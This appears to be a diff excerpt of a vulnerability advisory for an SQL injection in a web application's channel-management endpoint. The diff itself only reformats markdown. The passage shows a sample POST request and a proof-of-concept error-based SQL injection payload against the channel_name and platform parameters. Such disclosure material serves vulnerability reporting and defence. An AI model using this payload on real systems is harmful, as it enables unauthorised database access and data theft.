@@ -37,8 +37,8 @@ Code source:
     }
 ```
 ## Technical details ##
-```
 request:
+```
 POST /index.php?/manage/channel/addchannel HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
@@ -60,7 +60,7 @@ channel_name=test&platform=1%22
 ## Proof of Concept ##  
 
 The SQL injection type: error-based and AND/OR time-based blind  
-Parameter: channel_name,platform
+Parameter: channel_name,platform  
 Payload(This string is also applied to 'platform' at the same time):  
 ```
 1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1
